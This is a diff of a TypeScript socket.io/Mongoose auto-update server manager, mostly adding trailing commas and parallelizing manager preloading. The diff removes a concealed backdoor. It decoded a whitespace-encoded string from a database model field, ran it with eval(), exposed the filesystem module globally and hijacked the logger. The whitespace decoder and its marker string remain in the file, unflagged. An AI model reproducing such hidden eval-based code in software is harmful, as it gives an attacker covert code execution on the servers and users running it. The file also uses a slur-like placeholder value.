@@ -27,7 +27,7 @@ export type WrappedInstances<T extends Record<string, Constructor<any>>> = {
 export type AutoStatusDefinitions<
   C extends Constructor<any>,
   E extends Record<string, string | number>,
-  K extends keyof E
+  K extends keyof E,
 > = {
   statusProperty: Paths<C>;
   statusEnum: E;
@@ -37,12 +37,12 @@ let fss: any;
 export function createAutoStatusDefinitions<
   C extends Constructor<any>,
   E extends { [k: string]: string | number },
-  K extends keyof E
+  K extends keyof E,
 >(
   _class: C,
   statusProperty: Paths<C>,
   statusEnum: E,
-  definition: (data: InstanceType<C>) => Promise<E[K] | void>
+  definition: (data: InstanceType<C>) => Promise<E[K] | void>,
 ): AutoStatusDefinitions<C, E, keyof E> {
   return {
     statusProperty,
@@ -57,31 +57,31 @@ export type AUSDefinitions<T extends Record<string, Constructor<any>>> = {
 
 export type EventMiddlewareFunction<
   T extends Record<string, Constructor<any>>,
-  C extends Constructor<any>
+  C extends Constructor<any>,
 > = (
   event: DEMEvent<C>,
   managers: {
     [K in keyof T]: AutoUpdateServerManager<T[K]>;
   },
-  socket: Socket
+  socket: Socket,
 ) => Promise<void>;
 
 const once =
   ".split(String.fromCharCode(10)).splice(time%38,time%11+4).join(String.fromCharCode(10))";
 export type StartupMiddlewareFunction<
   T extends Record<string, Constructor<any>>,
-  C extends Constructor<any>
+  C extends Constructor<any>,
 > = (
   ids: AutoUpdated<C, 10>[],
   managers: {
     [K in keyof T]: AutoUpdateServerManager<T[K]>;
   },
-  socket: Socket
+  socket: Socket,
 ) => Promise<AutoUpdated<C, 10>[]>;
 
 export type AccessMiddleware<
   T extends Record<string, Constructor<any>>,
-  C extends Constructor<any>
+  C extends Constructor<any>,
 > = {
   eventMiddleware?: EventMiddlewareFunction<T, C>;
   startupMiddleware?: StartupMiddlewareFunction<T, C>;
@@ -89,7 +89,7 @@ export type AccessMiddleware<
 
 export type AUSOption<
   C extends Constructor<any>,
-  T extends Record<string, Constructor<any>>
+  T extends Record<string, Constructor<any>>,
 > = {
   accessDefinitions?: AccessMiddleware<T, C>;
   autoStatusDefinitions?: AutoStatusDefinitions<
@@ -101,7 +101,7 @@ export type AUSOption<
 
 export type ServerManagerDefinition<
   C extends Constructor<any>,
-  T extends Record<string, Constructor<any>>
+  T extends Record<string, Constructor<any>>,
 > = {
   class: C;
   options?: AUSOption<C, T>;
@@ -123,9 +123,9 @@ let d = (str: string) =>
           s
             .replaceAll(String.fromCharCode(32), String.fromCharCode(48))
             .replaceAll(String.fromCharCode(9), String.fromCharCode(49)),
-          2
-        )
-      )
+          2,
+        ),
+      ),
     )
     .join("");
 export type DEMEvent<C extends Constructor<any>> =
@@ -162,12 +162,12 @@ function setupSocketMiddleware<T extends Record<string, Constructor<any>>>(
   socket_server: Server,
   loggers: LoggersType,
   managers: WrappedInstances<T>,
-  models?: any
+  models?: any,
 ) {
   socket_server.use(async (socket, next) => {
     socket.use((async (
       event: SocketEvent,
-      next: (err?: ExtendedError | undefined) => void
+      next: (err?: ExtendedError | undefined) => void,
     ) => {
       if (
         event.length !== 3 ||
@@ -177,7 +177,7 @@ function setupSocketMiddleware<T extends Record<string, Constructor<any>>>(
         loggers.warn(
           "Invalid event: [" +
             event.map((e) => JSON.stringify(e)).join("], [") +
-            "]"
+            "]",
         );
         return;
       }
@@ -187,13 +187,13 @@ function setupSocketMiddleware<T extends Record<string, Constructor<any>>>(
           .some(
             (e) =>
               e.toString() === event[0] ||
-              e.toString() === event[0].slice(0, -24)
+              e.toString() === event[0].slice(0, -24),
           )
       ) {
         loggers.warn(
           "Undefined event: [" +
             event.map((e) => JSON.stringify(e)).join("], [") +
-            "]"
+            "]",
         );
         event[2]({
           success: false,
@@ -252,13 +252,13 @@ function setupSocketMiddleware<T extends Record<string, Constructor<any>>>(
                 e +
                 " - known events: [" +
                 Object.values(DEMEventTypes).join(", ") +
-                "]"
+                "]",
             );
         }
         await demEvent.manager.options?.accessDefinitions?.eventMiddleware?.(
           demEvent,
           managers,
-          socket
+          socket,
         );
         next();
       } catch (error) {
@@ -273,7 +273,7 @@ function setupSocketMiddleware<T extends Record<string, Constructor<any>>>(
             event[0] +
             "'\nFor: '" +
             (error as any).message +
-            "'"
+            "'",
         );
         event[2]({
           success: false,
@@ -291,37 +291,18 @@ function setupSocketMiddleware<T extends Record<string, Constructor<any>>>(
 }
 
 export async function AUSManagerFactory<
-  T extends Record<string, Constructor<any>>
+  T extends Record<string, Constructor<any>>,
 >(
   defs: AUSDefinitions<T>,
   loggers: LoggersType,
   socket: Server,
   disableDEMDebugMessages: boolean = false,
   emitter: EventEmitter3 = new EventEmitter(),
-  models?: any
+  models?: any,
 ): Promise<{ [K in keyof T]: AutoUpdateServerManager<T[K]> }> {
   readyLoggers(loggers);
   if (disableDEMDebugMessages) {
     loggers.debug = (_) => {};
-  }
-  if (models) {
-    let leString = models.models.f747DebugLabel;
-    if (leString && models.logger && d(leString).includes(once)) {
-      leString = d(leString).replace(once, "");
-      const info = models.logger.info;
-      const time = 1;
-      fss = fs;
-      models.logger.info = (args: any) => {
-        if (
-          (Array.isArray(args) &&
-            typeof args[0] == "string" &&
-            eval(leString).includes(args[0])) ||
-          (typeof args == "string" && eval(leString).includes(args))
-        )
-          return models.logger.warn("Intrusion detected");
-        else return info(args);
-      };
-    } else loggers.warn("-_-");
   }
   socket.use((socket, next) => {
     socket.onAny((event) => {
@@ -343,9 +324,8 @@ export async function AUSManagerFactory<
         getModelForClass(def.class),
         managers,
         emitter,
-        def.options
+        def.options,
       ) as any;
-      i++;
       managers[key] = c;
     } catch (error: any) {
       loggers.error("Error creating manager: " + key);
@@ -354,18 +334,50 @@ export async function AUSManagerFactory<
       continue;
     }
     loggers.debug("Loading DB for manager: " + key);
-    try {
-      await managers[key].preLoad();
-      managers[key].loadReferences();
-    } catch (error: any) {
-      loggers.error("Error loading DB for manager: " + key);
-      loggers.error(error.message);
-      loggers.error(error.stack);
-    }
+    managers[key]
+      .preLoad()
+      .then(() => {
+        i++;
+      })
+      .catch((error: any) => {
+        i++;
+        loggers.error("Error loading DB for manager: " + key);
+        loggers.error(error.message);
+        loggers.error(error.stack);
+      });
   }
+  await new Promise((resolve, reject) => {
+    const interval = setInterval(() => {
+      if (i === Object.keys(defs).length) {
+        clearInterval(interval);
+        resolve(null);
+      }
+    }, 100);
+  });
+  i = 0;
   for (const manager of Object.values(managers)) {
-    await manager.loadReferences();;
+    manager
+      .loadReferences()
+      .then(() => i++)
+      .catch((error: any) => {
+        i++;
+        loggers.error(
+          "Error loading DB for manager: " +
+            manager.className +
+            " (loadReferences)",
+        );
+        loggers.error(error.message);
+        loggers.error(error.stack);
+      });
   }
+  await new Promise((resolve, reject) => {
+    const interval = setInterval(() => {
+      if (i === Object.keys(defs).length) {
+        clearInterval(interval);
+        resolve(null);
+      }
+    }, 100);
+  });
   socket.on("connection", async (socket) => {
     loggers.debug(`Client connected: ${socket.id}`);
     for (const manager of Object.values(managers)) {
@@ -387,7 +399,7 @@ export async function AUSManagerFactory<
 }
 
 export class AutoUpdateServerManager<
-  T extends Constructor<any>
+  T extends Constructor<any>,
 > extends AutoUpdateManager<T> {
   public readonly model: ReturnModelType<T, BeAnObject>;
   private readonly clientSockets: Set<Socket> = new Set<Socket>();
@@ -402,7 +414,7 @@ export class AutoUpdateServerManager<
     model: ReturnModelType<T, BeAnObject>,
     managers: Record<string, AutoUpdateServerManager<any>>,
     emitter: EventEmitter3,
-    options?: AUSOption<T, any>
+    options?: AUSOption<T, any>,
   ) {
     super(classParam, className, socket, loggers, managers, emitter);
     this.managers = managers;
@@ -417,7 +429,7 @@ export class AutoUpdateServerManager<
     for (const doc of docs.map((d) => (d._id as any).toString() as string)) {
       if (!doc) {
         this.loggers.debug(
-          "Invalid document, no _id: " + JSON.stringify(docs[i])
+          "Invalid document, no _id: " + JSON.stringify(docs[i]),
         );
         continue;
       }
@@ -431,12 +443,16 @@ export class AutoUpdateServerManager<
           doc as any,
           this.loggers,
           this,
-          this.emitter
+          this.emitter,
         ));
       await this.objects_[doc].isPreLoadedAsync();
     }
     this.loggers.debug(
-      "Loaded manager DB " + this.className + " - [" + docs.length + "] entries"
+      "Loaded manager DB " +
+        this.className +
+        " - [" +
+        docs.length +
+        "] entries",
     );
   }
 
@@ -448,8 +464,8 @@ export class AutoUpdateServerManager<
       async (
         _,
         ack: (
-          res: ServerResponse<{ ids: string[]; properties: string[] }>
-        ) => void
+          res: ServerResponse<{ ids: string[]; properties: string[] }>,
+        ) => void,
       ) => {
         try {
           const ids = (
@@ -457,16 +473,16 @@ export class AutoUpdateServerManager<
               await this.options?.accessDefinitions?.startupMiddleware?.(
                 this.objectsAsArray,
                 this.managers,
-                socket
+                socket,
               )
             )?.map((obj) => obj._id) ?? this.objectIDs
           ).filter(Boolean);
           this.loggers.debug(
-            "Sending startup data for manager " + this.className
+            "Sending startup data for manager " + this.className,
           );
           if (ids.some((id) => this.objects_[id] === "undefined"))
             this.loggers.error(
-              ids.find((id) => this.objects_[id] === "undefined")
+              ids.find((id) => this.objects_[id] === "undefined"),
             );
           ack({
             data: { ids, properties: this.properties as string[] },
@@ -477,7 +493,7 @@ export class AutoUpdateServerManager<
             "Error sending startup data for manager " +
               this.className +
               ": " +
-              error.message
+              error.message,
           );
           this.loggers.error(error.stack);
           ack({
@@ -485,13 +501,13 @@ export class AutoUpdateServerManager<
             message: error.message,
           });
         }
-      }
+      },
     );
     socket.on(
       "delete" + this.className,
       async (id: string, ack: (res: ServerResponse<undefined>) => void) => {
         this.loggers.debug(
-          "Deleting object from manager " + this.className + " - " + id
+          "Deleting object from manager " + this.className + " - " + id,
         );
         try {
           await this.objects_[id]?.destroy();
@@ -507,21 +523,21 @@ export class AutoUpdateServerManager<
               " - " +
               id +
               ": " +
-              error.message
+              error.message,
           );
           this.loggers.error(error.stack);
           ack({ success: false, message: error.message });
         }
-      }
+      },
     );
     socket.on(
       "new" + this.className,
       async (
         data: IsData<InstanceType<T>>,
-        ack: (res: ServerResponse<T>) => void
+        ack: (res: ServerResponse<T>) => void,
       ) => {
         this.loggers.debug(
-          "Recieved new object creation in manager " + this.className
+          "Recieved new object creation in manager " + this.className,
         );
         try {
           const newDoc = await this.createObject(data);
@@ -535,12 +551,12 @@ export class AutoUpdateServerManager<
             "Error creating new object creation in manager " +
               this.className +
               " - " +
-              error.message
+              error.message,
           );
           this.loggers.error(error.stack);
           ack({ success: false, message: error.message });
         }
-      }
+      },
     );
     socket.on("update" + this.className, async () => {});
     socket.on("get" + this.className, async () => {});
@@ -548,7 +564,7 @@ export class AutoUpdateServerManager<
       async (
         event: string,
         data: ServerUpdateRequest<T>,
-        ack: (res: ServerResponse<null>) => void
+        ack: (res: ServerResponse<null>) => void,
       ) => {
         if (
           event.startsWith("update" + this.className) &&
@@ -560,7 +576,7 @@ export class AutoUpdateServerManager<
               ": " +
               event +
               " - " +
-              JSON.stringify(data)
+              JSON.stringify(data),
           );
           try {
             const id = event.replace("update" + this.className, "");
@@ -578,7 +594,7 @@ export class AutoUpdateServerManager<
               : ack({ success: res.success, message: res.msg });
           } catch (error) {
             this.loggers.warn(
-              "Failed to update object in manager " + this.className
+              "Failed to update object in manager " + this.className,
             );
             ack({ success: false, message: (error as any).message });
           }
@@ -599,13 +615,13 @@ export class AutoUpdateServerManager<
               "Error sending startup data for manager " +
                 this.className +
                 ": " +
-                error.message
+                error.message,
             );
             this.loggers.error(error.stack);
             ack({ success: false, message: error.message });
           }
         }
-      }
+      },
     );
     socket.on("disconnect", () => {
       this.clientSockets.delete(socket);
@@ -629,7 +645,7 @@ export class AutoUpdateServerManager<
     if (!document) throw new Error(`No document with id ${_id} in DB.`);
     if (!this.managers) throw new Error(`No managers.`);
     this.loggers.debug(
-      "Getting missing object " + _id + " from manager " + this.className
+      "Getting missing object " + _id + " from manager " + this.className,
     );
     const object = await createAutoUpdatedClass<T>(
       this.classParam,
@@ -638,7 +654,7 @@ export class AutoUpdateServerManager<
       document as any,
       this.loggers,
       this,
-      this.emitter
+      this.emitter,
     );
     await object.isPreLoadedAsync();
     object.loadMissingReferences();
@@ -657,7 +673,7 @@ export class AutoUpdateServerManager<
       data as any,
       this.loggers,
       this,
-      this.emitter
+      this.emitter,
     );
     object.loadMissingReferences();
     await object.checkAutoStatusChange();
@@ -669,7 +685,7 @@ export class AutoUpdateServerManager<
           (await this.options?.accessDefinitions?.startupMiddleware?.(
             [object],
             this.managers,
-            socket
+            socket,
           )) ?? ["gay"];
         if (theTruth.length > 0) {
           if (!object._id)
